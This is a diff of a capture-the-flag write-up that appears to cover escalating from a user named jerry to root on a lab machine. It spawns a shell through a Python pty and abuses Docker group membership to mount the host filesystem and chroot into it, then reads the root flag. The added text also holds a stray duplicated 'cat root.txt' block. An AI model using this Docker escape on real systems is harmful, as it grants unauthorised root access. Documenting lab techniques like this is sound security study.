@@ -112,14 +112,45 @@ sudo -u jerry /home/robin/project/feedback.sh
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+
+
+
+The root flag file was read using the command:
+
+Bash
+cat root.txt
+
+
+
+
+
 ## 8. Privilege Escalation: Jerry to Root
 The `id` command revealed that the user `jerry` was a member of the `docker` group (gid 114).
-* This privilege was exploited by running a Docker container to mount the root directory using the command :
+
+This privilege was exploited by running a Docker container to mount the root directory using the command :
 
 ```bash
-docker run -v /:/mnt -rm -it alpine chroot /mnt sh
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
-* The directory was changed to root using `cd /root`.
-* The root flag file was read using `cat root.txt`.
-* The final Root-Flag discovered was: `Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}`.
+Change directory to root using :
+
+```bash
+cd /root
+```
+
+The contents of the root directory were listed using the command:
+
+```Bash
+ls
+```
+
+This reveals the `root.txt` file.
+
+The root flag file was read using the command:
+
+```bash
+cat root.txt
+```
+
+The final Root-Flag discovered was: `Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}`.
